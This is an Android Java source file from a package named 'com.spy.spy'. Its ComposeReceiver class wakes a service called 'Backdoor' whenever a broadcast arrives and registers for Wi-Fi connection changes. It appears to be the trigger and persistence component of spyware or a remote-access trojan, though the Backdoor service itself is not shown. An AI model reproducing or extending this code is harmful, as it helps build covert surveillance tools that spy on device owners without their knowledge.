package com.spy.spy;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.wifi.WifiManager;

public class ComposeReceiver extends BroadcastReceiver {
    public ComposeReceiver() {
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        String action=intent.getAction();
        startService(context,action);
    }
    void startService(Context context,String action){
        Intent sc = new Intent(context, Backdoor.class);
        sc.putExtra("action",action);
        context.startService(sc);
    }
    void register(Context context){
        IntentFilter intentFilter = new IntentFilter();
        intentFilter.addAction(WifiManager.SUPPLICANT_CONNECTION_CHANGE_ACTION);
        context.registerReceiver(this, intentFilter);
    }
}
